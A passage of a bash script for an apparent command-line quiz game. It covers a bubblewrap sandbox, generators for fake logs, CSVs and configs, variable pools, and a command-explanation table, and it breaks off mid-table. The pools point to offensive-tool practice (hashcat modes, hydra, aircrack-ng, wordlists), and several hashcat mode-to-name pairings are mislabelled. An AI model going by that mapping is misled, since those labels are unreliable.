#!/usr/bin/env bash
# cmdchamp
set -uo pipefail
[[ ${BASH_VERSINFO[0]:-0} -lt 4 || (${BASH_VERSINFO[0]} -eq 4 && ${BASH_VERSINFO[1]:-0} -lt 3) ]] && { echo "Requires bash 4.3+"; exit 1; }
_tty() { [[ -t 0 ]] || { echo "Error: requires interactive terminal" >&2; exit 1; }; }

DATA="${XDG_DATA_HOME:-$HOME/.local/share}/cmdchamp"; mkdir -p "$DATA"; touch "$DATA/scores"

# ═══════════════════════════════════════════════════════════════════════════════
# SANDBOX SYSTEM - Real command execution in isolated environment
# ═══════════════════════════════════════════════════════════════════════════════
SANDBOX_MODE=1  # ON by default
SANDBOX_PRISTINE="$DATA/sandbox.pristine"
SANDBOX_DIR="$DATA/sandbox"

# Check bwrap dependency
_check_bwrap() {
  command -v bwrap &>/dev/null || {
    echo -e "${R}Error: bubblewrap (bwrap) not installed${N}" >&2
    echo "Install: paru -S bubblewrap" >&2
    SANDBOX_MODE=0
    return 1
  }
}

# Generate log file with realistic nginx-style entries
_gen_log() {
  local f="$1" lines="${2:-50}"
  local ips=("192.168.1.100" "10.0.0.5" "172.16.0.50" "192.168.8.1" "10.10.10.10")
  local codes=("200" "200" "200" "200" "301" "304" "400" "403" "404" "500")
  local methods=("GET" "GET" "GET" "POST" "PUT" "DELETE")
  local paths=("/" "/index.html" "/api/users" "/api/data" "/login" "/static/style.css" "/favicon.ico" "/admin" "/search" "/api/v1/status")
  local agents=("Mozilla/5.0" "curl/7.68" "wget" "Python-requests" "Go-http-client")
  > "$f"
  for ((i=0; i<lines; i++)); do
    local ip="${ips[$((RANDOM % ${#ips[@]}))]}"
    local code="${codes[$((RANDOM % ${#codes[@]}))]}"
    local method="${methods[$((RANDOM % ${#methods[@]}))]}"
    local path="${paths[$((RANDOM % ${#paths[@]}))]}"
    local agent="${agents[$((RANDOM % ${#agents[@]}))]}"
    local size=$((RANDOM % 50000 + 100))
    local ts=$(date -d "-$((RANDOM % 86400)) seconds" "+%d/%b/%Y:%H:%M:%S +0000" 2>/dev/null || date "+%d/%b/%Y:%H:%M:%S +0000")
    printf '%s - - [%s] "%s %s HTTP/1.1" %s %d "%s"\n' "$ip" "$ts" "$method" "$path" "$code" "$size" "$agent" >> "$f"
  done
}

# Generate app log with ERROR/WARN/INFO levels
_gen_app_log() {
  local f="$1" lines="${2:-40}"
  local levels=("INFO" "INFO" "INFO" "INFO" "WARN" "WARN" "ERROR" "DEBUG")
  local msgs_info=("Request processed" "User logged in" "Cache hit" "Connection established" "Task completed" "Session started")
  local msgs_warn=("Slow query detected" "Memory usage high" "Rate limit approaching" "Deprecated API used" "Retry attempt")
  local msgs_error=("Connection refused" "Timeout exceeded" "Invalid request" "Permission denied" "Database error" "Null pointer")
  > "$f"
  for ((i=0; i<lines; i++)); do
    local level="${levels[$((RANDOM % ${#levels[@]}))]}"
    local ts=$(date -d "-$((RANDOM % 86400)) seconds" "+%Y-%m-%d %H:%M:%S" 2>/dev/null || date "+%Y-%m-%d %H:%M:%S")
    local msg
    case "$level" in
      INFO|DEBUG) msg="${msgs_info[$((RANDOM % ${#msgs_info[@]}))]}";;
      WARN) msg="${msgs_warn[$((RANDOM % ${#msgs_warn[@]}))]}";;
      ERROR) msg="${msgs_error[$((RANDOM % ${#msgs_error[@]}))]}";;
    esac
    printf '[%s] %s: %s\n' "$ts" "$level" "$msg" >> "$f"
  done
}

# Generate CSV with headers and typed data
_gen_csv() {
  local f="$1" rows="${2:-30}"
  local names=("Alice" "Bob" "Charlie" "Diana" "Eve" "Frank" "Grace" "Henry" "Ivy" "Jack")
  local domains=("example.com" "test.org" "demo.net" "sample.io")
  local statuses=("active" "active" "active" "inactive" "pending")
  echo "id,name,email,status,timestamp" > "$f"
  for ((i=1; i<=rows; i++)); do
    local name="${names[$((RANDOM % ${#names[@]}))]}"
    local domain="${domains[$((RANDOM % ${#domains[@]}))]}"
    local status="${statuses[$((RANDOM % ${#statuses[@]}))]}"
    local ts=$(date -d "-$((RANDOM % 2592000)) seconds" "+%Y-%m-%d" 2>/dev/null || date "+%Y-%m-%d")
    printf '%d,%s,%s@%s,%s,%s\n' "$i" "$name" "${name,,}" "$domain" "$status" "$ts" >> "$f"
  done
}

# Generate INI config
_gen_ini() {
  local f="$1"
  cat > "$f" <<'EOF'
[server]
host = 0.0.0.0
port = 8080
workers = 4
timeout = 30

[database]
type = postgresql
host = localhost
port = 5432
name = appdb
user = admin

[logging]
level = info
file = /var/log/app.log
rotate = daily

[cache]
enabled = true
ttl = 3600
backend = redis
EOF
}

# Generate YAML config
_gen_yaml() {
  local f="$1"
  cat > "$f" <<'EOF'
server:
  host: 0.0.0.0
  port: 8080
  workers: 4
  ssl:
    enabled: false
    cert: /etc/ssl/cert.pem

database:
  primary:
    host: localhost
    port: 5432
    name: appdb
  replica:
    host: replica.local
    port: 5432

logging:
  level: info
  outputs:
    - stdout
    - file:/var/log/app.log

features:
  cache: true
  metrics: true
  debug: false
EOF
}

# Generate plain text notes
_gen_txt() {
  local f="$1"
  cat > "$f" <<'EOF'
Meeting Notes - Project Review
==============================

Attendees: Alice, Bob, Charlie

Action Items:
1. Update documentation
2. Fix authentication bug
3. Deploy to staging
4. Review security patches

Discussion Points:
- Performance improvements needed
- New feature requests from users
- Timeline for next release

TODO: Schedule follow-up meeting
TODO: Review pull requests
TODO: Update dependencies

Notes:
The deployment went smoothly.
Minor issues with caching fixed.
Need to monitor error rates.

Completed tasks:
- Database migration
- API versioning
- Load testing
EOF
}

# Generate user data CSV
_gen_users_csv() {
  local f="$1" rows="${2:-20}"
  local fnames=("john" "jane" "mike" "sarah" "tom" "lisa" "david" "emma" "alex" "olivia")
  local lnames=("smith" "jones" "wilson" "brown" "taylor" "davis" "miller" "garcia" "martinez" "lee")
  local roles=("admin" "user" "user" "user" "moderator" "guest")
  echo "username,fullname,role,created,logins" > "$f"
  for ((i=1; i<=rows; i++)); do
    local fn="${fnames[$((RANDOM % ${#fnames[@]}))]}"
    local ln="${lnames[$((RANDOM % ${#lnames[@]}))]}"
    local role="${roles[$((RANDOM % ${#roles[@]}))]}"
    local logins=$((RANDOM % 500))
    local ts=$(date -d "-$((RANDOM % 31536000)) seconds" "+%Y-%m-%d" 2>/dev/null || date "+%Y-%m-%d")
    printf '%s_%s,%s %s,%s,%s,%d\n' "$fn" "$ln" "${fn^}" "${ln^}" "$role" "$ts" "$logins" >> "$f"
  done
}

# Generate JSON data
_gen_json() {
  local f="$1"
  cat > "$f" <<'EOF'
{
  "version": "1.0.0",
  "data": [
    {"id": 1, "name": "Item One", "status": "active", "count": 42},
    {"id": 2, "name": "Item Two", "status": "pending", "count": 17},
    {"id": 3, "name": "Item Three", "status": "active", "count": 89},
    {"id": 4, "name": "Item Four", "status": "inactive", "count": 5}
  ],
  "metadata": {
    "total": 4,
    "generated": "2024-01-15"
  }
}
EOF
}

# Generate all sandbox files
_gen_sandbox_files() {
  local dir="$1"
  mkdir -p "$dir"/{src/test,logs,data}

  _gen_log "$dir/server.log" 50
  _gen_app_log "$dir/app.log" 40
  _gen_csv "$dir/data.csv" 30
  _gen_users_csv "$dir/users.csv" 20
  _gen_ini "$dir/config.ini"
  _gen_yaml "$dir/settings.yaml"
  _gen_txt "$dir/notes.txt"
  _gen_json "$dir/data/export.json"

  # Access/error logs
  _gen_log "$dir/logs/access.log" 30
  _gen_app_log "$dir/logs/error.log" 20

  # Safe script (echo only)
  cat > "$dir/backup.sh" <<'EOF'
#!/bin/bash
echo "Backup started at $(date)"
echo "Backing up files..."
echo "Backup complete!"
EOF
  chmod +x "$dir/backup.sh"

  # Python source files
  cat > "$dir/main.py" <<'EOF'
#!/usr/bin/env python3
"""Main application module."""

def main():
    print("Hello, World!")
    return 0

if __name__ == "__main__":
    main()
EOF

  cat > "$dir/src/utils.py" <<'EOF'
"""Utility functions."""

def helper(x):
    return x * 2

def process(data):
    return [helper(item) for item in data]
EOF

  cat > "$dir/src/test/test_utils.py" <<'EOF'
"""Tests for utils module."""
import unittest

class TestUtils(unittest.TestCase):
    def test_helper(self):
        self.assertEqual(helper(2), 4)

if __name__ == "__main__":
    unittest.main()
EOF
}

# Initialize sandbox (create pristine copy if needed)
_sandbox_init() {
  ((SANDBOX_MODE)) || return 0
  _check_bwrap || return 1
  if [[ ! -d "$SANDBOX_PRISTINE" ]]; then
    _gen_sandbox_files "$SANDBOX_PRISTINE"
  fi
  _sandbox_reset
}

# Reset sandbox to pristine state
_sandbox_reset() {
  ((SANDBOX_MODE)) || return 0
  [[ -d "$SANDBOX_PRISTINE" ]] || return 1
  rm -rf "$SANDBOX_DIR"
  cp -a "$SANDBOX_PRISTINE" "$SANDBOX_DIR"
}

# Execute command in sandbox with bwrap isolation
_sandbox_exec() {
  local cmd="$1" timeout_sec="${2:-5}"
  ((SANDBOX_MODE)) || return 1

  # Build bwrap args - bind /lib* only if they exist
  local -a bwrap_args=(
    --ro-bind /usr /usr
    --ro-bind /bin /bin
    --ro-bind /etc/passwd /etc/passwd
    --ro-bind /etc/group /etc/group
    --bind "$SANDBOX_DIR" /sandbox
    --chdir /sandbox
    --setenv HOME /sandbox
    --setenv USER sandbox
    --unshare-all
    --die-with-parent
    --new-session
  )
  [[ -e /lib ]] && bwrap_args+=(--ro-bind /lib /lib)
  [[ -e /lib64 ]] && bwrap_args+=(--ro-bind /lib64 /lib64)

  timeout "$timeout_sec" bwrap "${bwrap_args[@]}" /bin/bash -c "$cmd" 2>&1
}

# Track if command was destructive (for per-question reset)
_SANDBOX_DESTRUCTIVE=0
_is_destructive() {
  local cmd="$1"
  [[ "$cmd" =~ (^|[[:space:]])(rm|mv|cp|>|>>|chmod|chown)[[:space:]] ]] && return 0
  return 1
}

# Validate command output
# Returns 0 if output matches expected
# Expected formats:
#   exact text - exact match
#   ~regex     - regex match
#   @N         - line count match
#   *          - any output (just check command ran)
_sandbox_check_output() {
  local actual="$1" expected="$2"
  [[ -z "$expected" ]] && return 1

  case "$expected" in
    \~*)  # Regex match
      local pattern="${expected:1}"
      [[ "$actual" =~ $pattern ]] && return 0
      ;;
    @*)   # Line count match
      local count="${expected:1}"
      local lines=$(echo -n "$actual" | wc -l)
      ((lines == count)) && return 0
      ;;
    \*)   # Any output
      [[ -n "$actual" ]] && return 0
      ;;
    *)    # Exact match (trimmed)
      actual="${actual#"${actual%%[![:space:]]*}"}"
      actual="${actual%"${actual##*[![:space:]]}"}"
      expected="${expected#"${expected%%[![:space:]]*}"}"
      expected="${expected%"${expected##*[![:space:]]}"}"
      [[ "$actual" == "$expected" ]] && return 0
      ;;
  esac
  return 1
}

# Validate file state after command
# Formats: exists:file, !exists:file, contains:file:pattern, lines:file:N
_sandbox_check_state() {
  local checks="$1"
  IFS=',' read -ra checks_arr <<< "$checks"
  for check in "${checks_arr[@]}"; do
    case "$check" in
      exists:*)
        local file="${check#exists:}"
        [[ -e "$SANDBOX_DIR/$file" ]] || return 1
        ;;
      !exists:*)
        local file="${check#!exists:}"
        [[ ! -e "$SANDBOX_DIR/$file" ]] || return 1
        ;;
      contains:*:*)
        local rest="${check#contains:}"
        local file="${rest%%:*}"
        local pattern="${rest#*:}"
        grep -q "$pattern" "$SANDBOX_DIR/$file" 2>/dev/null || return 1
        ;;
      lines:*:*)
        local rest="${check#lines:}"
        local file="${rest%%:*}"
        local count="${rest#*:}"
        local actual=$(wc -l < "$SANDBOX_DIR/$file" 2>/dev/null)
        ((actual == count)) || return 1
        ;;
    esac
  done
  return 0
}
# Terminal state management
_stty_saved=""
_cleanup() { [[ -n "$_stty_saved" ]] && stty "$_stty_saved" 2>/dev/null; echo; }
trap '_cleanup; exit 0' INT TERM HUP EXIT
R=$'\e[31m' G=$'\e[32m' Y=$'\e[33m' Bl=$'\e[34m' M=$'\e[35m' C=$'\e[36m' W=$'\e[97m' D=$'\e[2m' B=$'\e[1m' N=$'\e[0m'
PROMPT_CHAR="${CMD_PROMPT:-$([[ $EUID -eq 0 ]] && echo '# ' || echo '$ ')}"

# ═══════════════════════════════════════════════════════════════════════════════
# VARIABLE POOLS
# ═══════════════════════════════════════════════════════════════════════════════

# SANDBOX FILES - files that actually exist in sandbox
declare -a SANDBOX_LOGS=(server.log app.log logs/access.log logs/error.log)
declare -a SANDBOX_TXTS=(notes.txt)
declare -a SANDBOX_CSVS=(data.csv users.csv)
declare -a SANDBOX_CFGS=(config.ini settings.yaml)
declare -a SANDBOX_SCRIPTS=(backup.sh)
declare -a SANDBOX_PY=(main.py src/utils.py src/test/test_utils.py)

# LOGS - 25 options (was 10)
declare -a LOGS=(server.log app.log system.log auth.log access.log error.log debug.log nginx.log apache.log syslog
  messages kern.log daemon.log mail.log secure dpkg.log pacman.log audit.log boot.log faillog lastlog
  wtmp btmp cron.log yum.log dmesg)

# CONFIGS - 20 options (was 8)
declare -a CONFIGS=(config.ini settings.conf app.yaml server.conf nginx.conf httpd.conf my.cnf pg.conf
  redis.conf sshd_config sudoers fstab hosts resolv.conf profile bashrc vimrc tmux.conf gitconfig
  docker-compose.yml)

# SCRIPTS - 20 options (was 8)
declare -a SCRIPTS=(backup.sh deploy.sh build.sh test.sh cleanup.sh migrate.sh sync.sh init.sh
  setup.sh install.sh update.sh monitor.sh healthcheck.sh rotate.sh fetch.sh push.sh start.sh stop.sh
  restart.sh validate.sh)

# TXTS - 15 options (was 7)
declare -a TXTS=(data.txt notes.txt output.txt report.txt dump.txt results.txt temp.txt
  readme.txt todo.txt changelog.txt manifest.txt inventory.txt urls.txt hosts.txt targets.txt)

# CSVS - 12 options (was 6)
declare -a CSVS=(data.csv users.csv logs.csv export.csv report.csv stats.csv
  metrics.csv transactions.csv inventory.csv orders.csv customers.csv events.csv)

# BINS - 12 options (was 6)
declare -a BINS=(binary.exe program.elf app.bin firmware.bin malware.exe sample.bin
  payload.dll trojan.exe rootkit.so agent.bin dropper.exe beacon.bin)

# IMGS - 10 options (was 4)
declare -a IMGS=(disk.img backup.img system.img evidence.img
  memory.dmp vmcore.dmp hiberfil.sys pagefile.sys snapshot.raw forensic.dd)

# PCAPS - 10 options (was 4)
declare -a PCAPS=(capture.pcap traffic.pcap network.pcap dump.pcap
  scan.pcap attack.pcap session.pcap handshake.pcap dns.pcap http.pcap)

# HASHES - 12 options (was 6)
declare -a HASHES=(hash.txt hashes.txt md5.txt sha256.txt passwd.txt shadow.txt
  ntlm.txt cracked.txt potfile.txt wordlist.hash lm.txt bcrypt.txt)

# WORDLISTS - 12 options (was 4)
declare -a WORDLISTS=(wordlist.txt rockyou.txt passwords.txt dict.txt
  common.txt custom.txt leaked.txt company.txt names.txt cities.txt hybrid.txt rules.txt)

# ARCHIVES - 12 options (was 5)
declare -a ARCHIVES=(backup.tar.gz archive.tar.gz files.tgz data.tar.bz2 export.zip
  snapshot.tar.xz bundle.tar release.tar.gz package.tar.gz source.tar.bz2 logs.tar.gz dump.tar.zst)

# PHOTOS - 12 options (was 5)
declare -a PHOTOS=(photo.jpg image.png screenshot.png evidence.jpg document.pdf
  scan.tiff capture.bmp diagram.svg icon.ico avatar.webp thumbnail.gif render.raw)

# DIRS - 20 options (was 10)
declare -a DIRS=(src lib bin tmp logs data config backup output cache
  build dist vendor node_modules target public static assets uploads downloads)

# EXTS - 25 options (was 15)
declare -a EXTS=(py js ts go rs c cpp java rb sh log txt conf yaml json
  toml md html css sql xml csv ini env php pl lua zig swift)

# SEARCH_TERMS - 25 options (was 11)
declare -a SEARCH_TERMS=(error warning panic fatal timeout exception failed invalid denied refused connection
  unauthorized forbidden crash segfault nullptr overflow leak abort reject throttle blocked suspend
  corrupt missing expired revoked)

# USERNAMES - 20 options (was 10)
declare -a USERNAMES=(admin root user guest test deploy www-data nginx postgres mysql
  git jenkins ansible prometheus grafana redis mongodb elastic backup operator service)

# IPS - Dynamic generation + pool of 15 (was 7)
declare -a IPS=(10.0.0.1 10.0.0.5 10.10.10.10 192.168.1.1 192.168.1.100 172.16.0.1 10.0.0.50
  192.168.0.1 172.16.1.1 10.10.10.50 192.168.100.1 10.20.30.40 172.31.0.1 192.168.50.50 10.0.1.1)

# SUBNETS - 10 options (was 4)
declare -a SUBNETS=(10.0.0.0/24 192.168.1.0/24 172.16.0.0/16 10.10.10.0/24
  192.168.0.0/24 172.17.0.0/16 10.20.0.0/16 192.168.100.0/24 10.0.0.0/8 172.31.0.0/16)

# PORTS - 25 options (was 11)
declare -a PORTS=(22 80 443 8080 3000 5000 8000 3306 5432 6379 27017
  21 23 25 53 110 143 389 445 993 995 1433 1521 5900 8443)

# MACS - 10 options (was 3)
declare -a MACS=(AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 DE:AD:BE:EF:CA:FE
  00:11:22:33:44:55 A1:B2:C3:D4:E5:F6 12:34:56:78:9A:BC FE:DC:BA:98:76:54
  CA:FE:BA:BE:00:01 01:23:45:67:89:AB AB:CD:EF:12:34:56)

# URLS - 12 options (was 4)
declare -a URLS=(http://10.0.0.1 http://192.168.1.100 http://target.local http://10.10.10.10
  http://192.168.0.1 http://172.16.1.1 http://dev.local http://staging.local
  http://app.local http://api.local http://admin.local http://internal.local)

# FIELDS - 15 options (was 10)
declare -a FIELDS=(name id status email timestamp user_id created_at value count type
  updated_at deleted_at version priority level source target duration size)

# JSON_KEYS - 12 options (was 6)
declare -a JSON_KEYS=(data items results users records entries
  events messages logs errors nodes objects resources payload)

# REPLACE_OLD/NEW - 15 pairs each (was 8)
declare -a REPLACE_OLD=(foo old debug localhost http TODO FIXME tmp
  dev staging test alpha beta v1 deprecated warn error secret)
declare -a REPLACE_NEW=(bar new prod 10.0.0.1 https DONE RESOLVED cache
  prod production live release stable v2 current info success masked)

# SIZES - 10 options (was 5)
declare -a SIZES=(10M 50M 100M 500M 1G 5G 10G 100K 500K 2G)

# TIMES - 10 options (was 4)
declare -a TIMES=(5 15 30 60 120 180 360 720 1440 10080)  # minutes (up to 1 week)

# NUMBERS - dynamic, use _rnum for truly random
declare -a NUMBERS=(5 10 15 20 25 30 40 50 75 100 150 200 500)

# COLUMNS - 8 options (was 5)
declare -a COLUMNS=(1 2 3 4 5 6 7 8)

# DELIMS - 8 options (was 5)
declare -a DELIMS=(',' ':' '\t' '|' ';' '/' '-' '_')

# HASHCAT_MODES - 15 options with names (was 5)
declare -a HASHCAT_MODES=(0 100 1400 1800 3200 1000 5600 13100 18200 22000 500 1700 2500 5500 11300)
declare -a HASH_NAMES=(MD5 SHA1 SHA256 SHA512 bcrypt NTLM NetNTLMv2 Kerberos5 Kerberos5-etype23 WPA-PBKDF2 md5crypt SHA512crypt WPA Kerberos5-RC4 Bitcoin)

# INTERFACES - 10 options (was 4)
declare -a INTERFACES=(eth0 wlan0 ens33 enp0s3 ens192 enp0s25 wlp2s0 docker0 br0 virbr0)

# REMOTE_HOSTS - 15 options (was 6)
declare -a REMOTE_HOSTS=(server backup-host db-server web-server jump-host bastion
  prod-01 staging-01 dev-01 ci-runner build-server cache-01 redis-01 postgres-01 monitor)

# NEW: Process names for ps/kill questions
declare -a PROCS=(nginx apache2 mysqld postgres redis-server mongod node python3 java ruby
  docker containerd systemd sshd cron cups NetworkManager pulseaudio pipewire)

# NEW: Services for systemctl
declare -a SERVICES=(nginx apache2 mysql postgresql redis docker containerd sshd
  NetworkManager bluetooth cups cronie fail2ban ufw firewalld syncthing)

# NEW: Signals for kill
declare -a SIGNALS=(SIGTERM SIGKILL SIGHUP SIGINT SIGUSR1 SIGUSR2 SIGSTOP SIGCONT)

# NEW: Git branches
declare -a BRANCHES=(main master develop feature/auth feature/api fix/login hotfix/security release/v2)

# ═══════════════════════════════════════════════════════════════════════════════
# DYNAMIC GENERATION HELPERS - True infinite variation
# ═══════════════════════════════════════════════════════════════════════════════

# Unbiased random selection using rejection sampling
_pick() {
  local -n arr=$1
  local len=${#arr[@]}
  ((len == 0)) && { echo ""; return; }
  local max=$((32768 - 32768 % len)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo "${arr[$((r % len))]}"
}

# Unbiased random number in range: _rnum 1 100 -> random 1-100
_rnum() {
  local lo=$1 hi=$2
  ((lo > hi)) && { local t=$lo; lo=$hi; hi=$t; }  # swap if inverted
  local range=$((hi - lo + 1))
  local max=$((32768 - 32768 % range)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo $((lo + r % range))
}

# Random IP octet variations
_rip() { echo "$(($RANDOM % 255)).$(($RANDOM % 255)).$(($RANDOM % 255)).$(($RANDOM % 255 + 1))"; }

# Random port (common range)
_rport() { echo $(( 1024 + RANDOM % 64000 )); }

# Random line count
_rlines() { echo $(( 5 + RANDOM % 96 )); }  # 5-100

# Shuffle flags: "-la" can become "-al" or "-l -a"
_shuf_flags() {
  local flags="$1"
  [[ ${#flags} -le 2 ]] && { echo "$flags"; return; }
  # Remove leading dash, shuffle chars, add back
  local chars="${flags#-}"
  local shuffled=$(echo "$chars" | fold -w1 | shuf | tr -d '\n')
  echo "-$shuffled"
}

# Generate both flag orders for answers: "-la" -> "-la|-al"
_flag_alts() {
  local flags="$1"
  [[ ${#flags} -le 2 ]] && { echo "$flags"; return; }
  local chars="${flags#-}"
  local rev=$(echo "$chars" | rev)
  [[ "$chars" == "$rev" ]] && { echo "$flags"; return; }
  echo "$flags|-$rev"
}

# Unbiased pick from phrasings
_phrase() {
  local -a opts=("$@")
  local len=${#opts[@]}
  ((len == 0)) && { echo ""; return; }
  local max=$((32768 - 32768 % len)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo "${opts[$((r % len))]}"
}

# Context helper: sets all common vars in caller's scope (use with: local log cfg txt ... ; _ctx)
_ctx() {
  log=$(_pick LOGS); log2=$(_pick LOGS); cfg=$(_pick CONFIGS); cfg2=$(_pick CONFIGS)
  txt=$(_pick TXTS); txt2=$(_pick TXTS); csv=$(_pick CSVS); csv2=$(_pick CSVS)
  dir=$(_pick DIRS); dir2=$(_pick DIRS); ext=$(_pick EXTS); ext2=$(_pick EXTS)
  script=$(_pick SCRIPTS); archive=$(_pick ARCHIVES); bin=$(_pick BINS)
  img=$(_pick IMGS); pcap=$(_pick PCAPS); hash=$(_pick HASHES); photo=$(_pick PHOTOS)
  wordlist=$(_pick WORDLISTS); ip=$(_pick IPS); subnet=$(_pick SUBNETS)
  port=$(_pick PORTS); port2=$(_pick PORTS); mac=$(_pick MACS)
  url=$(_pick URLS); user=$(_pick USERNAMES); host=$(_pick REMOTE_HOSTS)
  term=$(_pick SEARCH_TERMS); term2=$(_pick SEARCH_TERMS); term3=$(_pick SEARCH_TERMS)
  field=$(_pick FIELDS); field2=$(_pick FIELDS); key=$(_pick JSON_KEYS)
  old=$(_pick REPLACE_OLD); new=$(_pick REPLACE_NEW); size=$(_pick SIZES)
  iface=$(_pick INTERFACES); proc=$(_pick PROCS); svc=$(_pick SERVICES)
  sig=$(_pick SIGNALS); branch=$(_pick BRANCHES); time=$(_pick TIMES)
  n1=$(_rnum 1 20); n2=$(_rnum 5 50); n3=$(_rnum 2 10); col=$(_rnum 1 5); n=$n1
}

# ═══════════════════════════════════════════════════════════════════════════════
# COMMAND EXPLANATIONS (shown on TAB)
# ═══════════════════════════════════════════════════════════════════════════════
declare -A EXP=(
  [pwd]="print working directory (where you are)"
  [echo]="print text to stdout" [cat]="concatenate and display file contents" [ls]="list directory contents"
  [cd]="change directory" [cp]="copy files" [mv]="move/rename files" [rm]="delete files permanently"
  [mkdir]="create directory" [touch]="create file/update timestamp"
  [head]="head -N FILE: first N lines (default 10)"
  [tail]="tail -N FILE: last N lines (-f to follow)"
  [grep]="grep PATTERN FILE: search lines matching pattern"
  [find]="find PATH -name 'x': locate files by name/size/date"
  [wc]="word count: -l lines, -w words, -c bytes"
  [sort]="sort lines alphabetically (-n numeric, -r reverse, -k N by column N)"
  [uniq]="filter adjacent duplicates (use sort | uniq for all dupes)" [cut]="cut -d',' -fN: extract column N"
  ['--sort=-%cpu']="sort by CPU% descending (- = descending)"
  ['--sort=-%mem']="sort by memory% descending"
  [tr]="tr FROM TO: map chars (tr a-z A-Z = lowercase→uppercase)"
  [diff]="compare files" [tar]="archive tool" [tee]="copy stdin to file AND stdout" [xargs]="build commands from stdin"
  [chmod]="change permissions" [kill]="send signal to process (default: terminate)" [jobs]="list background jobs" [fg]="foreground job"
  [bg]="background job" [sleep]="pause N seconds" [make]="build tool" [gcc]="C compiler"
  [date]="show/set date" [du]="disk usage" [ps]="list processes" [mount]="attach filesystem"
  [dd]="low-level copy" [strings]="extract text from binary" [base64]="encode/decode base64"
  [rg]="ripgrep: fast grep" [fd]="fast find" [eza]="modern ls" [bat]="cat with highlighting"
  [sd]="simple sed" [dust]="visual du" [tree]="directory tree" [sed]="stream editor" [xxd]="hex dump"
  [md5sum]="MD5 hash (weak)" [sha256sum]="SHA256 hash" [nmap]="port scanner" [hydra]="password cracker"
  [hashcat]="GPU hash cracker" [john]="John the Ripper" [tshark]="terminal wireshark"
  [masscan]="fast port scanner" [airmon-ng]="WiFi monitor mode"
  [airodump-ng]="capture 802.11" [aireplay-ng]="inject packets" [aircrack-ng]="crack WPA/WEP"
  [nc]="netcat" [smbclient]="SMB client" [lynis]="security audit" [binwalk]="firmware analysis"
  [foremost]="file recovery" [fls]="list disk image" [exiftool]="file metadata" [readelf]="ELF info"
  [r2]="radare2 RE framework" [volatility3]="memory forensics" [mactime]="filesystem timeline"
  [proxychains]="proxy traffic" [procs]="modern ps"
  [awk]="pattern scanning & processing" [jq]="JSON processor" [curl]="transfer data (HTTP/FTP)"
  [ssh]="secure shell" [scp]="secure copy" [rsync]="fast incremental transfer"
  [zip2john]="extract hash from zip" [pdf2john]="extract hash from pdf" [rar2john]="extract hash from rar"
  [openssl]="crypto toolkit" [socat]="multipurpose relay" [tmux]="terminal multiplexer"
  [ln]="create links" [readlink]="show link target" [pgrep]="find process by name" [pkill]="kill by name"
  [pidof]="get PID by name" [pstree]="process tree" [ip]="network config" [ss]="socket statistics"
  [lsof]="list open files" [systemctl]="systemd control" [journalctl]="systemd logs"
  [wget]="download files" [unlink]="remove link"
  ['$$']="current shell PID" ['$?']="last exit code" ['$!']="last background PID"
  ['$#']="argument count" ['$@']="all arguments" ['$0']="script name"
  ['!!']="repeat last command" ['!$']="last arg of prev cmd" ['!^']="first arg of prev cmd" ['!*']="all args of prev cmd"
  ['>']="write stdout to file (overwrite)"
  ['>>']="append stdout to file"
  ['2>']="redirect stderr to file"
  ['&>']="redirect stdout+stderr to file"
  ['/dev/null']="black hole: discards anything written to it"
  ['2>&1']="merge stderr into stdout"
  ['<']="input redirect: feed file contents INTO command (like typing it)"
  ['<<<']="here-string: feed text INTO command (like typing it)"
  # Path symbols
  ['.']="current directory"
  ['..']="parent directory"
  ['~']="home directory"
  ['/']="root directory (or path separator)"
  ['/nope']="path that doesn't exist (triggers error to practice 2>)"
  ['/nonexistent']="path that doesn't exist (triggers error to practice 2>)"
  ['/x']="path that doesn't exist (triggers error to practice 2>)"
  # Globs/wildcards
  ['*']="wildcard: matches any characters"
  ['?']="wildcard: matches single character"
  ['*.py']="glob: all files ending in .py"
  ['*.log']="glob: all files ending in .log"
  ['*.txt']="glob: all files ending in .txt"
  ['*.sh']="glob: all files ending in .sh"
  ['*.conf']="glob: all files ending in .conf"
  # Quoted versions (as they appear in commands)
  ["'*.py'"]="glob: all .py files (quoted to prevent shell expansion)"
  ["'*.log'"]="glob: all .log files (quoted to prevent shell expansion)"
  ["'*.txt'"]="glob: all .txt files (quoted to prevent shell expansion)"
  ["'*.sh'"]="glob: all .sh files (quoted to prevent shell expansion)"
  ["'*.conf'"]="glob: all .conf files (quoted to prevent shell expansion)"
  ["'*'"]="glob: all files (quoted to prevent shell expansion)"
  # Quoting
  ["'...'"]="single quotes: literal string, no expansion"
  ['"..."']="double quotes: allows \$var expansion"
  ["'hello'"]="literal string 'hello'"
  ['|']="pipe: cmd1 | cmd2 (stdout→stdin)"
  ['|&']="pipe stdout+stderr"
  ['&&']="run next only if previous succeeds"
  ['||']="run next only if previous fails"
  ['&']="run in background (returns immediately)"
  ['a-z']="character range: all lowercase letters"
  ['A-Z']="character range: all uppercase letters"
  ['0-9']="character range: all digits"
  # Parameter expansion
  ['${#var}']="string length" ['${var:-}']="default if unset" ['${var:=}']="set if unset"
  ['${var:?}']="error if unset" ['${var:+}']="alt if set" ['${var#}']="remove prefix (short)"
  ['${var##}']="remove prefix (long)" ['${var%}']="remove suffix (short)" ['${var%%}']="remove suffix (long)"
  ['${var/}']="replace first" ['${var//}']="replace all" ['${var:n}']="substring from n"
  ['${var:n:m}']="substring n to m" ['${var,,}']="lowercase" ['${var^^}']="uppercase"
  # Arrays
  [declare]="declare variable type" [mapfile]="read lines into array" [readarray]="read lines into array"
  ['${arr[@]}']="all array elements" ['${#arr[@]}']="array length" ['${!arr[@]}']="array indices"
  # Control flow
  [if]="conditional execution" [then]="if body start" [else]="if alternative" [elif]="else if"
  [fi]="end if" [for]="loop over items" [while]="loop while true" [until]="loop until true"
  [do]="loop body start" [done]="end loop" [case]="pattern matching" [esac]="end case"
  [function]="define function" [local]="local variable" [return]="function return"
  [trap]="handle signals" [set]="shell options" [shopt]="bash options"
  # Advanced tools
  [strace]="trace syscalls" [ltrace]="trace library calls" [watch]="run command repeatedly"
  [inotifywait]="watch filesystem events" [parallel]="run jobs in parallel" [flock]="file locking"
  [timeout]="limit command runtime" [chroot]="change root dir" [fsck]="filesystem check"
  [cryptsetup]="LUKS encryption" [iptables]="IPv4 firewall" [nftables]="netfilter firewall"
  [shred]="secure file delete" [smartctl]="disk SMART info" [gcore]="dump process memory"
  [coproc]="coprocess (bidirectional pipe)" [mkfifo]="create named pipe" [fuser]="find process using file"
